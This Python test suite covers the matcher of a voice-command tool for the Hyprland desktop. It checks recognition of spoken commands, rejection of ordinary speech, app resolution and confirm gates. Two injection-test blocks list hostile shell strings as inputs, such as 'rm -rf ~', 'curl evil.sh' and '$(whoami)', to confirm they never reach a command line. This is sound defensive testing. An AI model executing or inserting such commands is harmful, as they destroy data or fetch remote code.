#!/usr/bin/env python3
"""Tests for the utter grammar and matcher.

Run: python3 tests/test_grammar.py

The matcher is the only part of Utter that decides whether something runs, so
this is where the safety guarantees are pinned down: no false positives on
ordinary speech, no argument injection through slots, and destructive commands
gated behind a confirm.
"""

import importlib.machinery
import importlib.util
import os
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "bin"))

# bin/utter has no .py suffix, so point the loader at it explicitly.
_loader = importlib.machinery.SourceFileLoader("utter", str(ROOT / "bin" / "utter"))
_spec = importlib.util.spec_from_loader("utter", _loader)
utter = importlib.util.module_from_spec(_spec)
_loader.exec_module(utter)

GRAMMAR = json.loads((ROOT / "default" / "commands.json").read_text())
M = utter.Matcher(GRAMMAR)

PASSED = 0
FAILED = []


def check(name, condition, detail=""):
    global PASSED
    if condition:
        PASSED += 1
    else:
        FAILED.append(f"{name}{(': ' + detail) if detail else ''}")


def match(text, threshold=0.80):
    hit, _cleaned = M.match(text, threshold)
    return hit


def expect(text, command_id, run=None):
    hit = match(text)
    if hit is None:
        check(f"{text!r} -> {command_id}", False, "no match")
        return
    check(f"{text!r} -> {command_id}", hit.cmd["id"] == command_id,
          f"got {hit.cmd['id']}")
    if run is not None:
        check(f"{text!r} runs {run!r}", hit.rendered == run, f"got {hit.rendered!r}")


def expect_none(text):
    hit = match(text)
    check(f"{text!r} -> no match", hit is None,
          f"matched {hit.cmd['id']} ({hit.score:.2f})" if hit else "")


# ---- exact phrases across every group ------------------------------------

DSP = "hyprctl dispatch "
expect("focus left", "focus.move", DSP + '\'hl.dsp.focus({ direction = "l" })\'')
expect("focus right", "focus.move", DSP + '\'hl.dsp.focus({ direction = "r" })\'')
expect("go up", "focus.move", DSP + '\'hl.dsp.focus({ direction = "u" })\'')
expect("move window down", "window.move", DSP + '\'hl.dsp.window.swap({ direction = "d" })\'')
expect("close window", "window.close", DSP + "'hl.dsp.window.close()'")
expect("full screen", "window.fullscreen")
expect("float this", "window.float")
expect("center this", "window.center")
expect("pin it", "window.pin")
expect("workspace 3", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "3" })\'')
expect("workspace three", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "3" })\'')
expect("go to workspace 9", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "9" })\'')
expect("next workspace", "workspace.next")
expect("previous workspace", "workspace.prev")
expect("throw this to 5", "workspace.throw", DSP + '\'hl.dsp.window.move({ workspace = "5" })\'')
# These no longer carry a run line: app names go through the resolver.
expect("open the browser", "app.launch")
expect("launch terminal", "app.launch")
expect("show clipboard", "clipboard.open")
expect("volume up", "volume.up")
expect("mute the microphone", "mic.mute")
expect("brighter", "brightness.up")
expect("night light", "nightlight.toggle")
expect("do not disturb", "dnd.toggle")
expect("take a screenshot", "capture.region")
expect("lock the screen", "session.lock", "omarchy system lock")

# ---- phrasings real speech produced that v1 did not cover ------------------
# Every one of these came out of the history file after the first evening of
# using it, transcribed exactly as whisper heard them.

expect("move this window to workspace 4", "workspace.throw",
       DSP + '\'hl.dsp.window.move({ workspace = "4" })\'')
expect("move this window to 4", "workspace.throw")
expect("send this window to workspace 2", "workspace.throw")
expect("move it to workspace 7", "workspace.throw")
expect("focus bottom", "focus.move", DSP + '\'hl.dsp.focus({ direction = "d" })\'')
expect("focus top", "focus.move", DSP + '\'hl.dsp.focus({ direction = "u" })\'')
expect("take me to workspace 5", "workspace.go")
expect("go back", "workspace.former")
expect("make this full screen", "window.fullscreen")

# Every Hyprland command must use the Lua dispatcher API. The bare form
# (`hyprctl dispatch workspace 3`) is accepted by the CLI, rejected by the
# compositor, and looked like success for a whole evening.
for cmd in GRAMMAR["commands"]:
    run = cmd.get("run", "")
    if run.startswith("hyprctl dispatch "):
        check(f"{cmd['id']} uses hl.dsp", "hl.dsp" in run, run)
expect("reboot", "session.reboot")

# ---- homophones whisper genuinely produces -------------------------------

expect("workspace to", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "2" })\'')
expect("workspace for", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "4" })\'')
expect("workspace ate", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "8" })\'')
expect("workspace won", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "1" })\'')

# ---- transcription noise: punctuation, case, fillers, wake words ----------

expect("Focus left.", "focus.move")
expect("FOCUS LEFT", "focus.move")
expect("  focus   left  ", "focus.move")
expect("um, please close window", "window.close")
expect("can you lock the screen", "session.lock")
expect("omarchy focus right", "focus.move")
expect("computer workspace 4", "workspace.go")
expect("hey omarchy next workspace", "workspace.next")

# ---- mishearings within tolerance ----------------------------------------

expect("focus lefd", "focus.move")
expect("close the windo", "window.close")
expect("vollume up", "volume.up")
expect("next workspase", "workspace.next")
expect("full-screen", "window.fullscreen")

# ---- the safety property: ordinary speech must not trigger anything -------
# This corpus is the kind of thing a hot mic picks up. Every one must be
# rejected, because a false positive here closes someone's window.

for phrase in [
    "banana pancakes",
    "i was thinking about the report we discussed yesterday",
    "yeah that sounds good to me",
    "hold on let me find the file",
    "the weather is really nice today",
    "so anyway what did you think of it",
    "i need to send that email before lunch",
    "did you get a chance to look at the pull request",
    "one two three testing",
    "hello",
    "",
    "   ",
    "thanks",
]:
    expect_none(phrase)

# ---- app launching by name -------------------------------------------------
# The enumerated three-app slot could not open the other 73 apps on this
# machine, so app names are free text resolved against installed .desktop
# entries. That means the one place raw speech enters the system, and the
# safety rule is that it may only ever reach a handler, never a command line.

for phrase, spoken in [
    ("open files", "files"),
    ("launch files", "files"),
    ("open brave", "brave"),
    ("start ghostty", "ghostty"),
    ("bring up teams", "teams"),
    ("switch to chromium", "chromium"),
    ("open up one password", "one password"),
]:
    hit = match(phrase)
    ok = hit is not None and hit.cmd["id"] == "app.launch" and hit.free.get("appname") == spoken
    check(f"{phrase!r} captures {spoken!r}", ok,
          f"{hit.cmd['id'] if hit else None} {hit.free if hit else {}}")

check("app.launch has no run line",
      not next(c for c in GRAMMAR["commands"] if c["id"] == "app.launch").get("run"))
check("app.launch is handled internally",
      next(c for c in GRAMMAR["commands"] if c["id"] == "app.launch").get("internal") == "launch")

# The rule, asserted over the whole grammar rather than one command.
free_slots = set(GRAMMAR.get("freeSlots", []))
check("free slots are declared", free_slots == {"appname"}, str(free_slots))
for cmd in GRAMMAR["commands"]:
    uses_free = any(name in free_slots
                    for t in cmd["say"] for name in utter.Matcher.SLOT_RE.findall(t))
    if uses_free:
        check(f"{cmd['id']} with a free slot has no run line", not cmd.get("run"))
        check(f"{cmd['id']} with a free slot has a handler", bool(cmd.get("internal")))
    for name in utter.Matcher.SLOT_RE.findall(cmd.get("run", "")):
        check(f"{cmd['id']} run line has no free slot", name not in free_slots)

# Speech that would be dangerous if it ever reached a shell.
for nasty in ["open files; rm -rf ~", "open $(whoami)", "launch foo && curl evil.sh",
              "open `id`", "open foo | tee /tmp/x"]:
    hit = match(nasty)
    if hit is None:
        check(f"{nasty[:28]!r} is safe", True)
        continue
    captured = hit.free.get("appname", "")
    check(f"{nasty[:28]!r} captures nothing dangerous",
          all(ch not in captured for ch in [";", "|", "&", "$", "`", "(", ")"]),
          repr(captured))
    check(f"{nasty[:28]!r} produces no run line", not hit.rendered)

# Every internal handler named in the grammar must exist.
for cmd in GRAMMAR["commands"]:
    if cmd.get("internal"):
        check(f"{cmd['id']} handler {cmd['internal']!r} exists",
              cmd["internal"] in utter.INTERNAL_HANDLERS,
              str(list(utter.INTERNAL_HANDLERS)))

# ---- the app resolver ------------------------------------------------------
# Against a fixed list, so the assertions do not depend on what is installed.

FAKE_APPS = [
    {"id": "org.gnome.Nautilus.desktop", "name": "Files", "binary": "nautilus",
     "wmclass": "org.gnome.Nautilus", "keywords": "", "generic": "File Manager"},
    {"id": "brave-browser.desktop", "name": "Brave", "binary": "brave",
     "wmclass": "brave-browser", "keywords": "", "generic": "Web Browser"},
    {"id": "1password.desktop", "name": "1Password", "binary": "1password",
     "wmclass": "1Password", "keywords": "", "generic": ""},
    {"id": "com.mitchellh.ghostty.desktop", "name": "Ghostty", "binary": "ghostty",
     "wmclass": "com.mitchellh.ghostty", "keywords": "", "generic": "Terminal"},
    {"id": "com.github.xournalpp.xournalpp.desktop", "name": "Xournal++",
     "binary": "xournalpp", "wmclass": "", "keywords": "", "generic": ""},
]

for spoken, expected in [
    ("files", "Files"),
    ("nautilus", "Files"),
    ("file manager", "Files"),
    ("brave", "Brave"),
    ("brave browser", "Brave"),
    ("ghostty", "Ghostty"),
    ("one password", "1Password"),     # whisper spells the digit out
    ("1password", "1Password"),
    ("x journal", "Xournal++"),
]:
    got = utter.resolve_app(spoken, FAKE_APPS)
    check(f"resolve {spoken!r} -> {expected}", got is not None and got[0]["name"] == expected,
          got[0]["name"] if got else "no match")

# An app that is not installed must resolve to nothing, not to the nearest
# thing alphabetically -- opening the wrong app is worse than opening none.
for spoken in ["spotify", "slack", "gimp", "photoshop", "zzzz", ""]:
    check(f"resolve {spoken!r} -> nothing", utter.resolve_app(spoken, FAKE_APPS) is None,
          str(utter.resolve_app(spoken, FAKE_APPS)))

check("desktop_apps reads this machine", len(utter.desktop_apps()) > 0)

# ---- focusing an app that is already open ----------------------------------
# "focus teams" must reach the app, while "focus left" must stay a direction.
# Both templates are "focus " plus one slot, so the tie is broken by preferring
# an enumerated slot over one that matches anything.

for phrase, expected in [
    ("focus left", "focus.move"),
    ("focus right", "focus.move"),
    ("focus up", "focus.move"),
    ("focus on left", "focus.move"),
    ("focus on the down", "focus.move"),
    ("focus teams", "app.launch"),
    ("focus on teams", "app.launch"),
    ("focus on obsidian", "app.launch"),
    ("go to brave", "app.launch"),
    ("show me files", "app.launch"),
]:
    hit = match(phrase)
    check(f"{phrase!r} -> {expected}", hit is not None and hit.cmd["id"] == expected,
          hit.cmd["id"] if hit else "no match")

# find_window against a fixed client list, so this does not depend on what
# happens to be open.
CLIENTS = [
    {"address": "0x1", "class": "brave-teams.microsoft.com__-Default",
     "initialClass": "brave-teams.microsoft.com__-Default", "title": "Calendar | Microsoft Teams"},
    {"address": "0x2", "class": "org.gnome.Nautilus", "initialClass": "org.gnome.Nautilus",
     "title": "Home"},
    {"address": "0x3", "class": "com.mitchellh.ghostty", "initialClass": "com.mitchellh.ghostty",
     "title": "~/Projects"},
    {"address": "0x4", "class": "brave-browser", "initialClass": "brave-browser",
     "title": "GitHub"},
]
TEAMS = {"id": "Teams.desktop", "name": "Teams", "binary": "omarchy-launch-webapp",
         "wmclass": "", "keywords": "", "generic": ""}
NAUTILUS = {"id": "org.gnome.Nautilus.desktop", "name": "Files", "binary": "nautilus",
            "wmclass": "", "keywords": "", "generic": ""}
GHOSTTY = {"id": "com.mitchellh.ghostty.desktop", "name": "Ghostty", "binary": "ghostty",
           "wmclass": "com.mitchellh.ghostty", "keywords": "", "generic": ""}
PINTA = {"id": "pinta.desktop", "name": "Pinta", "binary": "pinta", "wmclass": "Pinta",
         "keywords": "", "generic": ""}

check("web app found by name in its class",
      utter.find_window(TEAMS, CLIENTS) == "0x1", str(utter.find_window(TEAMS, CLIENTS)))
check("app found by binary in a reverse-dns class",
      utter.find_window(NAUTILUS, CLIENTS) == "0x2", str(utter.find_window(NAUTILUS, CLIENTS)))
check("app found by its declared window class",
      utter.find_window(GHOSTTY, CLIENTS) == "0x3", str(utter.find_window(GHOSTTY, CLIENTS)))
check("app that is not running is not found",
      utter.find_window(PINTA, CLIENTS) is None, str(utter.find_window(PINTA, CLIENTS)))
check("no windows at all is not a crash", utter.find_window(GHOSTTY, []) is None)

# The launcher binary must never be used as a window pattern: Teams' Exec is
# `omarchy-launch-webapp …`, and matching on that found nothing, so Utter
# reported "Focus Teams" and started a second copy instead.
check("launcher binaries are not window patterns",
      "omarchy-launch-webapp" in utter.GENERIC_BINARIES)
check("gtk-launch is not a window pattern", "gtk-launch" in utter.GENERIC_BINARIES)

# ---- destructive commands are gated --------------------------------------

for cid in ["session.reboot", "session.shutdown", "session.sleep"]:
    cmd = next(c for c in GRAMMAR["commands"] if c["id"] == cid)
    check(f"{cid} requires confirm", cmd.get("confirm") is True)

# ---- structural integrity -------------------------------------------------

ids = [c["id"] for c in GRAMMAR["commands"]]
check("command ids unique", len(ids) == len(set(ids)),
      f"dupes: {[i for i in ids if ids.count(i) > 1]}")

slots = set(GRAMMAR.get("slots", {})) | set(GRAMMAR.get("freeSlots", []))
for cmd in GRAMMAR["commands"]:
    for template in cmd["say"]:
        for name in utter.Matcher.SLOT_RE.findall(template):
            check(f"{cmd['id']} slot {{{name}}} exists", name in slots)
    for name in utter.Matcher.SLOT_RE.findall(cmd.get("run", "")):
        check(f"{cmd['id']} run slot {{{name}}} exists", name in slots)

check("no command opts into a shell",
      not any(c.get("shell") for c in GRAMMAR["commands"]))

# ---- injection: a slot can only ever be a value from the grammar ----------
# The run line is shlex-split, so the danger would be a slot smuggling extra
# arguments in. Slot values are canonical keys the grammar author wrote, and
# the spoken text is never substituted, so this holds by construction --
# assert it anyway, because it is the whole security model.

for attempt in [
    "workspace 3; rm -rf /",
    "focus left && curl evil.sh",
    "workspace $(whoami)",
    "focus left | tee /tmp/x",
]:
    hit = match(attempt)
    if hit is not None:
        rendered = hit.rendered
        check(f"{attempt!r} cannot inject",
              all(ch not in rendered for ch in [";", "|", "&", "$", "`"]),
              f"rendered {rendered!r}")
    else:
        check(f"{attempt!r} cannot inject", True)

# every slot value that can reach a run line is shell-safe
for slot_name, table in GRAMMAR.get("slots", {}).items():
    for canonical in table:
        check(f"slot {slot_name}={canonical} is safe",
              all(ch not in str(canonical) for ch in [";", "|", "&", "$", "`", " ", "\n"]))

# ---- rendering ------------------------------------------------------------

hit = match("workspace 7")
check("numeric slot labels as a digit", hit and hit.label == "Workspace 7",
      hit.label if hit else "")
hit = match("focus left")
check("word slot labels as a word", hit and hit.label == "Focus left",
      hit.label if hit else "")

# ---- the push-to-talk key shown in the popup -------------------------------
# Parsed out of `hyprctl binds -j` so the instruction follows a rebind. The
# modifier bitmask is the part worth pinning down.

check("modmask table is the Hyprland one",
      dict((n, b) for b, n in utter.MODMASK) == {"SUPER": 64, "ALT": 8, "CTRL": 4, "SHIFT": 1},
      str(utter.MODMASK))
check("push-to-talk description matches the binding we ship",
      utter.PTT_DESCRIPTION in (ROOT / "hypr" / "utter.lua").read_text())

LUA = (ROOT / "hypr" / "utter.lua").read_text()
check("exactly two bindings ship", LUA.count("o.bind(") == 2, str(LUA.count("o.bind(")))
check("press and release are both bound",
      "ptt start" in LUA and "ptt stop" in LUA and "release = true" in LUA)
check("no toggle binding ships", "utter listen" not in LUA.replace("`utter listen`", ""))
check("SUPER + CTRL + V is not claimed", "SUPER + CTRL + V" not in LUA.split("--", 1)[0]
      or "clipboard" in LUA.lower())

# ---- a grammar upgrade must not walk over someone's edits ------------------
# The marketplace checklist says a plugin must not overwrite user
# configuration without consent, and an edited grammar is exactly that.

import shutil as _shutil
import tempfile as _tempfile

_tmp = Path(_tempfile.mkdtemp(prefix="utter-migrate-"))
_old_config, _old_state = os.environ.get("XDG_CONFIG_HOME"), os.environ.get("XDG_STATE_HOME")
os.environ["XDG_CONFIG_HOME"] = str(_tmp / "config")
os.environ["XDG_STATE_HOME"] = str(_tmp / "state")
_m = importlib.machinery.SourceFileLoader("utter_migrate", str(ROOT / "bin" / "utter"))
_ms = importlib.util.spec_from_loader("utter_migrate", _m)
um = importlib.util.module_from_spec(_ms)
_m.exec_module(um)

# A fresh install records which shipped grammar it laid down.
um.ensure_config()
fresh = json.loads(um.COMMANDS_FILE.read_text())
check("a fresh grammar records its origin", bool(fresh.get("_shippedFrom")), str(fresh)[:80])
check("a fresh grammar is the shipped version",
      fresh.get("version") == GRAMMAR["version"], str(fresh.get("version")))

# An untouched file from an older version is ours to upgrade. Build it the
# way an older Utter would have: the old content, plus a marker recording
# that same content, so the fingerprint still matches.
old = {k: v for k, v in fresh.items() if k != um.SHIPPED_MARKER}
old["version"] = fresh["version"] - 1
old[um.SHIPPED_MARKER] = um.grammar_fingerprint(old)
um.atomic_write(um.COMMANDS_FILE, json.dumps(old, indent=2) + "\n")
check("a file we installed is recognised as unedited", um._matches_shipped(old))
result = um.migrate_grammar()
check("an unedited older grammar is replaced",
      result is not None and not str(result).startswith("!"), str(result))
check("...and the old one is kept", result and Path(result).exists())
check("...and the new one is current",
      json.loads(um.COMMANDS_FILE.read_text())["version"] == GRAMMAR["version"])

# An edited file is left exactly alone. One added command is enough: the
# fingerprint no longer matches what we wrote.
mine = json.loads(um.COMMANDS_FILE.read_text())
mine["version"] = mine["version"] - 1
mine["commands"].append({"id": "mine.custom", "group": "Mine",
                         "say": ["do my thing"], "run": "true", "label": "Mine"})
check("an edited file is not recognised as ours", not um._matches_shipped(mine))
edited = json.dumps(mine, indent=2) + "\n"
um.COMMANDS_FILE.write_text(edited)
result = um.migrate_grammar()
check("an edited grammar is not replaced", str(result).startswith("!"), str(result))
check("...the file is untouched byte for byte",
      um.COMMANDS_FILE.read_text() == edited)
check("...my command survives",
      "mine.custom" in um.COMMANDS_FILE.read_text())
check("...and the new grammar is offered alongside",
      (um.CONFIG_DIR / "commands.new.json").exists())
check("...where it is the current version",
      json.loads((um.CONFIG_DIR / "commands.new.json").read_text())["version"]
      == GRAMMAR["version"])

_shutil.rmtree(_tmp, ignore_errors=True)
for _k, _v in (("XDG_CONFIG_HOME", _old_config), ("XDG_STATE_HOME", _old_state)):
    if _v is None:
        os.environ.pop(_k, None)
    else:
        os.environ[_k] = _v

# ---- transcript parsing ---------------------------------------------------
# Voxtype puts progress lines on stdout next to the transcript. These are
# verbatim captures from voxtype 0.7.5. The empty-transcript case is the
# dangerous one: before the blank-line rule, "Transcription completed in 1.81s"
# was returned as the transcript and fed straight into the matcher.

SPEECH_OUT = (
    'Loading audio file: "/tmp/a.wav"\n'
    "Audio format: 16000 Hz, 1 channel(s), Int\n"
    "Processing 81600 samples (5.10s)...\n"
    "\n"
    "Ask not what your country can do for you.\n"
)
SILENT_OUT = (
    'Loading audio file: "/tmp/b.wav"\n'
    "Audio format: 16000 Hz, 1 channel(s), Int\n"
    "Processing 93157 samples (5.82s)...\n"
    "\n"
    "\n"
)
VERBOSE_OUT = (
    '\x1b[2m2026-09-03T20:52:41.735778Z\x1b[0m \x1b[32m INFO\x1b[0m '
    'Transcription completed in 1.81s: ""\n'
    "\n"
    "\n"
)

check("transcript: real speech output",
      utter.parse_transcript(SPEECH_OUT) == "Ask not what your country can do for you.",
      repr(utter.parse_transcript(SPEECH_OUT)))
check("transcript: silent audio yields nothing",
      utter.parse_transcript(SILENT_OUT) == "", repr(utter.parse_transcript(SILENT_OUT)))
check("transcript: ANSI log line is not a transcript",
      utter.parse_transcript(VERBOSE_OUT) == "", repr(utter.parse_transcript(VERBOSE_OUT)))
check("transcript: bare line with no blank separator",
      utter.parse_transcript("Focus left.") == "Focus left.")
check("transcript: noise with no blank separator yields nothing",
      utter.parse_transcript("whisper_init_state: kv self size = 6.29 MB") == "")
check("transcript: empty input", utter.parse_transcript("") == "")
check("transcript: whitespace only", utter.parse_transcript("\n  \n\t\n") == "")
check("transcript: multi-line transcript keeps the last line",
      utter.parse_transcript("Processing 1 samples...\n\nfocus left\n") == "focus left")

# The whole point: nothing voxtype prints around a failed transcription may
# reach the matcher.
for noisy in [SILENT_OUT, VERBOSE_OUT, "whisper_init_state: compute buffer = 96 MB\n"]:
    check("no command matches voxtype noise", match(utter.parse_transcript(noisy)) is None)

# ---- normalization helpers ------------------------------------------------

check("normalize strips punctuation", utter.normalize("Focus, left!") == "focus left")
check("normalize keeps digits", utter.normalize("Workspace 3.") == "workspace 3")
check("drop_fillers keeps meaning", utter.drop_fillers("um close window") == "close window")
check("drop_fillers never empties", utter.drop_fillers("please") == "please")
check("strip_leaders", utter.strip_leaders("can you close window") == "close window")

# ---- report ---------------------------------------------------------------

print(f"\n{PASSED} passed, {len(FAILED)} failed")
for f in FAILED:
    print(f"  FAIL  {f}")
sys.exit(1 if FAILED else 0)
